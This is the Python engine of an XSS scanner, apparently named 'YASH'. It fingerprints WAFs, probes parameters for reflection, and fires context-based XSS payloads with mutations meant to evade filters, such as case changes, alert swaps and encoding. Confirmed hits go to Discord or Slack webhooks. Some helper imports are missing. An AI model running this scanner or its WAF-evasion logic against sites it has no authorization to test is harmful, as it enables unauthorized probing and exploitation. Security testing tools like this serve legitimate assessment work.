"""Core XSS scanning engine module."""
import hashlib
import html as html_module
import json
import random
import re
import string
import threading
import time
import urllib.parse
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

import requests
from bs4 import BeautifulSoup

# ─────────────────────────────────────────────────────────────
# Load Configuration
# ─────────────────────────────────────────────────────────────
CONFIG_PATH = Path(__file__).parent.parent / "data" / "config.json"

def load_config():
    """Load configuration from JSON file."""
    if CONFIG_PATH.exists():
        with open(CONFIG_PATH, 'r') as f:
            return json.load(f)
    return {"browser_agents": [], "bypass_headers": {}, "waf_signatures": {}, "context_payloads": {}}

CONFIG = load_config()

# ─── ENUMS & DATACLASSES ───────────────────────────────────────
class ReflectionContext(Enum):
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    HTML_ATTRIBUTE_QUOTED = "html_attribute_quoted"
    JAVASCRIPT_STRING = "javascript_string"
    JAVASCRIPT_VAR = "javascript_var"
    DOM = "dom"
    NO_REFLECTION = "no_reflection"

class WAFType(Enum):
    CLOUDFLARE = "Cloudflare"
    AKAMAI = "Akamai"
    AWS_WAF = "AWS WAF"
    AZURE_WAF = "Azure WAF"
    IMPERVA = "Imperva/Incapsula"
    SUCURI = "Sucuri"
    MODSECURITY = "ModSecurity"
    F5_BIG_IP = "F5 BIG-IP"
    WORDFENCE = "Wordfence"
    GENERIC = "Generic WAF"
    NONE = "No WAF Detected"

@dataclass
class WAFResult:
    detected: bool
    waf_type: WAFType
    confidence: float
    bypass_recommendations: List[str]

@dataclass
class ReflectionResult:
    url: str
    parameter: str
    reflects: bool
    context: ReflectionContext
    reflection_count: int
    filtered_chars: List[str]
    confidence: float

# ─── POLYMORPHIC ENGINE ───────────────────────────────────────
class PolymorphicEngine:
    """Generates evasive payload variants."""
    @staticmethod
    def obfuscate(payload: str) -> str:
        result = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
        if random.random() > 0.6:
            to_hex = {'<': '&#x3c;', '>': '&#x3e;', '"': '&#x22;', "'": '&#x27;'}
            for ch, enc in to_hex.items():
                result = result.replace(ch, enc)
        if random.random() > 0.8:
            result = result.replace('<', '<%00')
        return result

    @staticmethod
    def mutate(payload: str) -> List[str]:
        mutations = [
            payload.replace("alert", "confirm"),
            payload.replace("alert", "prompt"),
            payload.replace("<script>", "<ScRiPt>"),
            payload.replace("onerror", "oNeRrOr"),
            payload.replace("onload", "ONLOAD"),
            payload.replace(" ", "/**/"),
            payload.replace("alert(", "alert`"),
            payload.replace("alert(", "window['alert']("),
        ]
        return [m for m in mutations if m != payload]

# ─── WAF DETECTOR ───────────────────────────────────────────────
class WAFDetector:
    def __init__(self, verify_ssl=True, gui_logger=None):
        self.verify_ssl = verify_ssl
        self.gui_logger = gui_logger
        self.signatures = CONFIG.get("waf_signatures", {})
        if not self.verify_ssl:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def _log(self, msg):
        if self.gui_logger:
            self.gui_logger(msg)

    def detect(self, url: str) -> WAFResult:
        try:
            s = requests.Session()
            r1 = s.get(url, timeout=10, verify=self.verify_ssl)
            if r1.status_code in [403, 406, 429]:
                return self._match_signatures(r1)
            r2 = s.get(f"{url}?t=<script>alert(1)</script>'", timeout=10, verify=self.verify_ssl)
            headers = {**dict(r1.headers), **dict(r2.headers)}
            return self._check_response(r2, headers, 0.9)
            return WAFResult(False, WAFType.NONE, 1.0, [])
        except:
            return WAFResult(False, WAFType.NONE, 0.0, [])

    def _match_signatures(self, response) -> WAFResult:
        headers_str = str(response.headers).lower()
        body = response.text.lower()
        server = response.headers.get('Server', '').lower()
        
        for waf_name, sigs in self.signatures.items():
            if (any(h in headers_str for h in sigs.get('h', [])) or
                any(sv in server for sv in sigs.get('s', [])) or
                any(b in body for b in sigs.get('b', []))):
                waf_type = WAFType[waf_name.upper()] if waf_name.upper() in WAFType.__members__ else WAFType.GENERIC
                return WAFResult(True, waf_type, 0.99, ["Global Block Detected", "Use extreme encoding"])
        return WAFResult(False, WAFType.NONE, 1.0, [])

    def _check_response(self, response, headers, confidence) -> WAFResult:
        headers_str = str(headers).lower()
        body = response.text.lower()
        
        for waf_name, sigs in self.signatures.items():
            if (any(h in headers_str for h in sigs.get('h', [])) or
                any(b in body for b in sigs.get('b', []))):
                waf_type = WAFType[waf_name.upper()] if waf_name.upper() in WAFType.__members__ else WAFType.GENERIC
                return WAFResult(True, waf_type, confidence, ["Use encoding", "Try SVG payloads"])
        return WAFResult(False, WAFType.NONE, 1.0, [])

# ─── WAF BYPASS ENGINE ───────────────────────────────────────────
class WAFBypassEngine:
    @classmethod
    def get_payloads(cls, waf_type: WAFType) -> List[str]:
        payloads = CONFIG.get("waf_payloads", {})
        waf_key = waf_type.name.lower()
        return payloads.get(waf_key, []) + payloads.get("generic", [])

    @classmethod
    def get_bypass_headers(cls, waf_detected: bool) -> dict:
        return CONFIG.get("bypass_headers", {}) if waf_detected else {}

# ─── REFLECTION TESTER ───────────────────────────────────────────
class ReflectionTester:
    XSS_CHARS = ['<', '>', '"', "'", '/', '\\', '(', ')', ';', '=', '`']

    def __init__(self, timeout=10, verify_ssl=True, gui_logger=None):
        self.timeout = timeout
        self.session = requests.Session()
        browser_agents = CONFIG.get("browser_agents", [])
        if browser_agents:
            self.session.headers.update({'User-Agent': random.choice(browser_agents)})
        self.session.verify = verify_ssl
        self.gui_logger = gui_logger
        if not verify_ssl:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def _log(self, msg):
        if self.gui_logger:
            self.gui_logger(msg)

    def test_reflection(self, url: str, parameter: str) -> ReflectionResult:
        canary = "yash" + "".join(random.choices(string.ascii_lowercase + string.digits, k=7))
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[parameter] = [canary]
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                               parsed.params, urlencode(params, doseq=True), parsed.fragment))
        try:
            resp = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
            if canary not in resp.text:
                return ReflectionResult(url, parameter, False, ReflectionContext.NO_REFLECTION, 0, [], 0.0)
            context = self._detect_context(resp.text, canary)
            filtered = self._test_filtering(url, parameter)
            confidence = self._calc_confidence(context, filtered)
            return ReflectionResult(url, parameter, True, context, resp.text.count(canary), filtered, confidence)
        except:
            return ReflectionResult(url, parameter, False, ReflectionContext.NO_REFLECTION, 0, [], 0.0)

    def _detect_context(self, body: str, canary: str) -> ReflectionContext:
        idx = body.find(canary)
        ctx = body[max(0, idx - 300):min(len(body), idx + len(canary) + 300)]
        if re.search(r'<script[^>]*>.*?' + re.escape(canary), ctx, re.I | re.S):
            return ReflectionContext.JAVASCRIPT_STRING if re.search(r'["\'].*?' + re.escape(canary), ctx) else ReflectionContext.JAVASCRIPT_VAR
        if re.search(r'<\w+[^>]+\w+\s*=\s*(["\']?)[^>]*?' + re.escape(canary), ctx, re.I):
            return ReflectionContext.HTML_ATTRIBUTE_QUOTED
        return ReflectionContext.HTML_BODY

    def _test_filtering(self, url: str, parameter: str) -> List[str]:
        filtered = []
        for char in self.XSS_CHARS:
            canary = "y" + "".join(random.choices(string.ascii_lowercase, k=4))
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[parameter] = [f"{canary}{char}{canary}"]
            try:
                r = self.session.get(
                    urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                parsed.params, urlencode(params, doseq=True), parsed.fragment)),
                    timeout=5)
                if f"{canary}{char}{canary}" not in r.text:
                    filtered.append(char)
            except:
                pass
        return filtered

    def _calc_confidence(self, context: ReflectionContext, filtered: List[str]) -> float:
        score = 0.9 if context == ReflectionContext.HTML_BODY else 0.7
        score -= len([c for c in filtered if c in ['<', '>', '"', "'"]]) * 0.15
        return max(0.0, score)

# ─── INLINE PAYLOAD ENGINE ───────────────────────────────────────
class _InlinePayloadEngine:
    def __init__(self):
        self.payloads = CONFIG.get("context_payloads", {})

    def get_payloads_for_context(self, context: ReflectionContext) -> List[str]:
        ctx_key = context.value
        return self.payloads.get(ctx_key, [])

# ─── YASH SCANNER (Main Engine) ───────────────────────────────────
class YASHScanner:
    def __init__(self, args, gui_logger=None):
        raw_domain = args.domain or "unknown"
        self.domain = raw_domain.replace("https://", "").replace("http://", "").strip("/").split("/")[0]
        self.threads = args.threads
        self.delay = args.delay
        self.webhook = getattr(args, 'webhook', None)
        self.slack_wh = getattr(args, 'slack', None)
        self.proxy = getattr(args, 'proxy', None)
        self.export_json = getattr(args, 'json', False)
        self.quick = getattr(args, 'quick', False)
        self.verify_ssl = getattr(args, 'verify_ssl', True)
        self.use_playwright = getattr(args, 'use_playwright', False)
        self.use_neural = getattr(args, 'use_neural', False)
        self.api_key = getattr(args, 'api_key', None)
        self.gui_logger = gui_logger or (lambda x: None)

        safe_name = self.domain.replace(':', '_').replace('*', '_')
        self.output_dir = Path(args.output) if hasattr(args, 'output') and args.output else \
                          Path(f"output/{safe_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.verify_ssl_warn()

        self.custom_payloads: List[str] = []
        if hasattr(args, 'payloads') and args.payloads:
            self._load_custom_payloads(args.payloads)

        self.waf_detector = WAFDetector(verify_ssl=self.verify_ssl, gui_logger=self.gui_logger)
        self.refl_tester = ReflectionTester(verify_ssl=self.verify_ssl, gui_logger=self.gui_logger)
        self.neural_engine = None  # Neural engine removed

        self.vulnerabilities: List[dict] = []
        self.tested_payloads: List[dict] = []
        self.reflections: List[ReflectionResult] = []
        self.live_hosts: Set[str] = set()
        self.subdomains: Set[str] = {self.domain}
        self.urls: Set[str] = set()
        self.waf_info = WAFResult(False, WAFType.NONE, 1.0, [])
        self.start_time = datetime.now()
        self.webhooks = {"discord": self.webhook, "slack": self.slack_wh}
        self.profile_file = self.output_dir / f"{self.domain}.specter"

        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.active_executor = None
        self.consecutive_errors = 0

        proxies = {"http": self.proxy, "https": self.proxy} if self.proxy else {}
        self.session = requests.Session()
        browser_agents = CONFIG.get("browser_agents", [])
        if browser_agents:
            self.session.headers.update({"User-Agent": random.choice(browser_agents)})
        self.session.proxies = proxies
        self.session.verify = self.verify_ssl

        self.report_file = self.output_dir / "yash_report.html"
        self.json_file = self.output_dir / "results.json"
        self.payload_engine = _InlinePayloadEngine()

    def _log(self, msg: str):
        self.gui_logger(f"{msg}\n")

    def verify_ssl_warn(self):
        if not self.verify_ssl:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def _load_custom_payloads(self, path: str):
        try:
            with open(path, 'r') as f:
                self.custom_payloads = [l.strip() for l in f if l.strip()]
            self._log(f"[+] Loaded {len(self.custom_payloads)} custom payloads")
        except Exception as e:
            self._log(f"[-] Error loading payloads: {e}")

    def _import_urls_from_file(self, path: str):
        try:
            with open(path, 'r') as f:
                imported = [l.strip() for l in f if l.strip() and '?' in l]
            self.urls.update(imported)
            self._log(f"[+] Imported {len(imported)} URLs")
        except Exception as e:
            self._log(f"[-] {e}")

    def send_webhooks(self, url: str, param: str, payload: str):
        for platform, wh_url in self.webhooks.items():
            if not wh_url:
                continue
            try:
                if platform == "discord":
                    data = {"content": "**[YASH XSS] Vulnerability Confirmed!**",
                            "embeds": [{"title": "XSS Verified", "color": 15158332,
                                        "fields": [{"name": "URL", "value": f"```\n{url}\n```"},
                                                   {"name": "Param", "value": param},
                                                   {"name": "Payload", "value": f"```html\n{payload}\n```"}]}]}
                else:
                    data = {"text": f"[YASH XSS] URL: {url}  Param: {param}  Payload: {payload}"}
                requests.post(wh_url, json=data, timeout=8)
            except:
                pass

    def run_waf_detection(self):
        target = list(self.live_hosts)[0] if self.live_hosts else f"https://{self.domain}"
        self.waf_info = self.waf_detector.detect(target)
        if self.waf_info.detected:
            self._log(f"[!] WAF DETECTED: {self.waf_info.waf_type.value}")
        else:
            self._log("[+] No WAF detected")

    def run_reflection_analysis(self):
        if not self.urls:
            self._log("[!] No URLs to analyze.")
            return
        url_list = list(self.urls)[:500]
        self.reflections.clear()

        def _check(url: str):
            if self.stop_event.is_set():
                return
            try:
                params = parse_qs(urlparse(url).query)
                for p in params:
                    res = self.refl_tester.test_reflection(url, p)
                    if res.reflects:
                        with self.lock:
                            self.reflections.append(res)
            except:
                pass

        self.active_executor = ThreadPoolExecutor(max_workers=self.threads * 2)
        try:
            futs = {self.active_executor.submit(_check, u): u for u in url_list}
            for fut in as_completed(futs):
                if self.stop_event.is_set():
                    break
        finally:
            self.active_executor.shutdown(wait=False)
            self.active_executor = None
        self._log(f"[+] {len(self.reflections)} reflection points found")

    def _scan_url(self, url: str):
        if self.stop_event.is_set():
            return
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return

        waf_type = self.waf_info.waf_type.value.lower() if self.waf_info.detected else "generic"
        known_reflective: Set[str] = {r.parameter for r in self.reflections if r.reflects and r.url == url}

        for param, _ in sorted(params.items()):
            if self.stop_event.is_set():
                return

            reflects = param in known_reflective
            context_from_refl = None
            if not reflects:
                hash_seed = f"{parsed.netloc}_{param}_salt"
                det_canary = "y" + hashlib.md5(hash_seed.encode()).hexdigest()[:6].lower() + "z"
                test_params = params.copy()
                test_params[param] = [det_canary]
                try:
                    if self.delay > 0:
                        time.sleep(self.delay)
                    resp = self.session.get(
                        urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                    parsed.params, urlencode({k: test_params[k] for k in sorted(test_params)}, doseq=True), parsed.fragment)),
                        timeout=8)
                    if det_canary in resp.text:
                        reflects = True
                        ctx_list = self._analyze_context(resp.text, det_canary)
                        context_from_refl = ctx_list[0] if ctx_list else "body"
                except:
                    pass

            if not reflects and self.quick:
                continue
            elif not reflects:
                reflects = True
                context_from_refl = "body"

            contexts = [context_from_refl] if context_from_refl else ["body", "attribute", "dom"]

            all_payloads: List[str] = []
            ctx_map = {
                "html_body": ReflectionContext.HTML_BODY,
                "html_attribute": ReflectionContext.HTML_ATTRIBUTE,
                "html_attribute_quoted": ReflectionContext.HTML_ATTRIBUTE_QUOTED,
                "javascript_string": ReflectionContext.JAVASCRIPT_STRING,
                "javascript_var": ReflectionContext.JAVASCRIPT_VAR,
                "dom": ReflectionContext.DOM,
                "body": ReflectionContext.HTML_BODY,
                "attribute": ReflectionContext.HTML_ATTRIBUTE_QUOTED,
                "script": ReflectionContext.JAVASCRIPT_STRING,
                "variable": ReflectionContext.JAVASCRIPT_VAR,
            }
            for ctx in contexts:
                ctx_enum = ctx_map.get(ctx, ReflectionContext.HTML_BODY)
                all_payloads.extend(self.payload_engine.get_payloads_for_context(ctx_enum))

            all_payloads.extend(self.custom_payloads)
            if self.waf_info.detected:
                all_payloads.extend(WAFBypassEngine.get_payloads(self.waf_info.waf_type))

            seen_p: Set[str] = set()
            unique_payloads: List[str] = []
            for p in all_payloads:
                if p not in seen_p:
                    seen_p.add(p)
                    unique_payloads.append(p)

            if not self.quick:
                extras: List[str] = []
                for p in unique_payloads[:8]:
                    extras.extend(PolymorphicEngine.mutate(p))
                for p in extras:
                    if p not in seen_p:
                        unique_payloads.append(p)
                        seen_p.add(p)

            bypass_hdrs = WAFBypassEngine.get_bypass_headers(self.waf_info.detected)

            for payload in unique_payloads:
                if self.stop_event.is_set():
                    return
                inj_params = params.copy()
                inj_params[param] = [payload]
                inj_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                     parsed.params, urlencode({k: inj_params[k] for k in sorted(inj_params)}, doseq=True), parsed.fragment))

                is_vuln = False
                try:
                    if self.delay > 0:
                        time.sleep(self.delay)
                    p_resp = self.session.get(inj_url, timeout=6, headers=bypass_hdrs)
                    if p_resp.status_code in [429, 503]:
                        with self.lock:
                            self.consecutive_errors += 1
                            if self.consecutive_errors >= 3:
                                self._log("[!] RATE LIMIT — backing off 5s...")
                                time.sleep(5)
                                self.consecutive_errors = 0
                    else:
                        with self.lock:
                            self.consecutive_errors = 0

                    decoded = urllib.parse.unquote(payload)
                    if (payload in p_resp.text or decoded in p_resp.text) and p_resp.status_code not in [403, 406, 400]:
                        time.sleep(0.5)
                        verify_resp = self.session.get(inj_url, timeout=6, headers=bypass_hdrs)
                        if payload in verify_resp.text and verify_resp.status_code not in [403, 406, 400]:
                            is_vuln = True
                            poc = f"curl -i '{inj_url}'"
                            vuln_ctx = contexts[0] if contexts else "body"
                            vuln = {"url": url, "injected_url": inj_url, "parameter": param,
                                    "context": vuln_ctx, "waf": waf_type,
                                    "payload": payload, "severity": "CRITICAL", "poc_curl": poc}
                            with self.lock:
                                self.vulnerabilities.append(vuln)
                                try:
                                    with open(self.output_dir / "realtime_vulns.json", "w") as f:
                                        json.dump(self.vulnerabilities, f, indent=4)
                                except:
                                    pass
                                self._log(f"[!!] VULN CONFIRMED | Param:{param} | Payload:{payload[:60]}")
                            self.send_webhooks(inj_url, param, payload)
                except:
                    pass

                with self.lock:
                    self.tested_payloads.append({"payload": payload, "is_vuln": is_vuln, "reflected": reflects})
                if is_vuln:
                    break

    def _analyze_context(self, html: str, canary: str) -> List[str]:
        contexts: Set[str] = set()
        soup = BeautifulSoup(html, 'html.parser')
        if soup.find_all(lambda tag: tag.attrs and any(canary in str(v) for v in tag.attrs.values())):
            contexts.add("attribute")
        for script in soup.find_all('script'):
            if script.string and canary in script.string:
                contexts.add("script")
                if "=" in script.string.split(canary)[0]:
                    contexts.add("variable")
        if canary in html and "attribute" not in contexts and "script" not in contexts:
            contexts.add("body")
        if "#" in html or "eval(" in html or "document.write(" in html or "innerHTML" in html:
            contexts.add("dom")
        if not contexts and canary in html:
            contexts.add("body")
        contexts.add("dom")
        return list(contexts)

    def run_exploitation(self, url_list: Optional[List[str]] = None):
        targets = url_list or list(self.urls)
        if not targets:
            self._log("[!] No URLs to scan.")
            return
        self.stop_event.clear()
        total = len(targets)
        completed = 0
        self.active_executor = ThreadPoolExecutor(max_workers=self.threads)
        try:
            futs = {self.active_executor.submit(self._scan_url, u): u for u in targets}
            for fut in as_completed(futs):
                if self.stop_event.is_set():
                    break
                completed += 1
                url = futs[fut]
                self._log(f"[*] [{completed}/{total}] Processed: {url[:70]}")
                if self.vulnerabilities:
                    self._log(f"[!!] {len(self.vulnerabilities)} BREACH(ES) CONFIRMED")
        finally:
            self.active_executor.shutdown(wait=False)
            self.active_executor = None

    def generate_report(self):
        output_file = self.report_file
        self._log(f"[*] Generating HTML Report → {output_file}")
        try:
            template_path = Path(__file__).parent.parent / "templates" / "report.html"
            if template_path.exists():
                with open(template_path, "r", encoding="utf-8") as f:
                    template = f.read()
            else:
                template = self._get_builtin_report_template()

            template = template.replace("{{ TARGET }}", self.domain)
            if self.vulnerabilities:
                status_block = '<div class="status-box status-danger">[!] CRITICAL VULNERABILITIES DISCOVERED</div>'
            else:
                tested_count = len(set(p['payload'] for p in self.tested_payloads))
                status_block = f'<div class="status-box status-safe">[+] NO VULNERABILITIES — TARGET SECURE</div>'
            template = template.replace("<!-- VULNERABLE_STATUS_PLACEHOLDER -->", status_block)

            cards_html = ""
            grouped = {}
            for v in self.vulnerabilities:
                p = urlparse(v["url"])
                base = f"{p.scheme}://{p.netloc}{p.path}"
                grouped.setdefault(base, []).append(v)
            for base_url, vulns in grouped.items():
                cards_html += f'<tr style="background:#222;"><td colspan="5"><strong style="color:var(--neon-cyan)">Endpoint: {html_module.escape(base_url)}</strong></td></tr>'
                pg = {}
                for v in vulns:
                    pl = v["payload"]
                    if pl not in pg:
                        pg[pl] = {"params": set(), "context": v["context"], "poc": v["poc_curl"], "injected_url": v["injected_url"]}
                    pg[pl]["params"].add(v["parameter"])
                for pl, data in pg.items():
                    params_str = ", ".join(sorted(data["params"]))
                    cards_html += (f'<tr><td>Params: <strong style="color:#ffcc00">{html_module.escape(params_str)}</strong></td>'
                                   f'<td style="color:#007bff">{html_module.escape(data["context"].upper())}</td>'
                                   f'<td><div class="payload-box">{html_module.escape(pl)}</div></td>'
                                   f'<td><code style="color:#00ff88;font-size:.8em">{html_module.escape(data["poc"])}</code></td>'
                                   f'<td><a href="{html_module.escape(data["injected_url"], quote=True)}" target="_blank" style="color:var(--neon-cyan)">[ REPRODUCE ]</a></td></tr>')
            template = template.replace("<!-- VULN_CARDS_PLACEHOLDER -->", cards_html)

            matrix_html = ""
            for p in self.tested_payloads[:100]:
                result = "REFLECTED" if p["reflected"] else "BLOCKED"
                reason = "Successful Breakout" if p["is_vuln"] else "HTML/URL Encoded"
                matrix_html += f'<tr><td><code>{html_module.escape(p["payload"])}</code></td><td>{result}</td><td>{reason}</td></tr>'
            template = template.replace("<!-- EXECUTION_LOG_PLACEHOLDER -->", matrix_html)

            with open(output_file, "w", encoding="utf-8") as f:
                f.write(template)
            self._log(f"[+] Report saved → {output_file}")
        except Exception as e:
            self._log(f"[-] Report error: {e}")

    def _get_builtin_report_template(self) -> str:
        return """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>YASH XSS Report | {{ TARGET }}</title>
<style>
body{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:20px}
h1{color:#00d9ff}.status-box{padding:15px;border-radius:6px;margin:20px 0;font-weight:bold}
.status-danger{background:rgba(255,0,85,.15);border:1px solid #ff0055;color:#ff0055}
.status-safe{background:rgba(0,255,136,.1);border:1px solid #00ff88;color:#00ff88}
:root{--neon-cyan:#00d9ff}table{width:100%;border-collapse:collapse;margin:20px 0}
th,td{padding:8px;border:1px solid #333;text-align:left}
.payload-box{background:#000;padding:4px 8px;border-radius:4px;color:#00ff88;font-size:.85em}
</style></head><body>
<h1>YASH XSS → {{ TARGET }}</h1>
<!-- VULNERABLE_STATUS_PLACEHOLDER -->
<h2>Vulnerabilities</h2>
<table><tr><th>Parameter(s)</th><th>Context</th><th>Payload</th><th>POC</th><th>Action</th></tr>
<!-- VULN_CARDS_PLACEHOLDER -->
</table><h2>Payload Matrix</h2>
<table><tr><th>Payload</th><th>Result</th><th>Reason</th></tr>
<!-- EXECUTION_LOG_PLACEHOLDER -->
</table></body></html>"""

    def save_profile(self):
        data = {"domain": self.domain, "subdomains": list(self.subdomains),
                "live_hosts": list(self.live_hosts), "urls": list(self.urls),
                "vulnerabilities": self.vulnerabilities, "timestamp": datetime.now().isoformat()}
        self.output_dir.mkdir(parents=True, exist_ok=True)
        with open(self.profile_file, 'w') as f:
            json.dump(data, f, indent=4)
        self._log(f"[+] Profile saved: {self.profile_file}")

    def export_to_json(self):
        data = {"domain": self.domain, "scan_time": self.start_time.isoformat(),
                "duration": str(datetime.now() - self.start_time),
                "statistics": {"subdomains": len(self.subdomains), "live_hosts": len(self.live_hosts),
                               "urls": len(self.urls), "reflections": len(self.reflections),
                               "vulnerabilities": len(self.vulnerabilities)},
                "waf_detected": self.waf_info.detected,
                "waf_type": self.waf_info.waf_type.value if self.waf_info.detected else None,
                "vulnerabilities": self.vulnerabilities}
        self.output_dir.mkdir(parents=True, exist_ok=True)
        with open(self.json_file, 'w') as f:
            json.dump(data, f, indent=2)
        self._log(f"[+] JSON exported → {self.json_file}")
